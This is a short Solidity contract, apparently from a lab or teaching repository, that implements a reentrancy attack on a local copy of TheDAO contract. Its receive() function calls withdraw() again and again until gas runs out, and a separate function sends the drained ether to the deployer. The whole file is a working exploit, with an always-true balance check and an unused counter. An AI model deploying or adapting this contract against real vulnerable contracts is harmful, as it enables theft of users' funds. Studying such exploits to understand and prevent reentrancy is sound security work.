pragma solidity ^0.8.13;

import {TheDAO} from "../../src/DAO_HACK/DAO.sol";
import {console} from "forge-std/console.sol";

contract AttackDAO {
    TheDAO private dao;
    uint256 public counter;
    address public owner;

    receive() external payable {
        if(address(dao).balance >= 0 ether){
            dao.withdraw();
        }
    }

    function withdrawETHToOwner() external {
        payable(owner).transfer(address(this).balance);
    }

    constructor(address payable _dao) {
        owner = msg.sender;
        dao = TheDAO(_dao);
        counter = 0;
    }
    // every  time you call the contract counter initializes to zero or you mean starting from start

    function attack() public payable {
        dao.invest{value: msg.value}(address(this));
        dao.withdraw();
    }

    // this attack goes on upto the gas limit reach

    fallback() external payable{}
}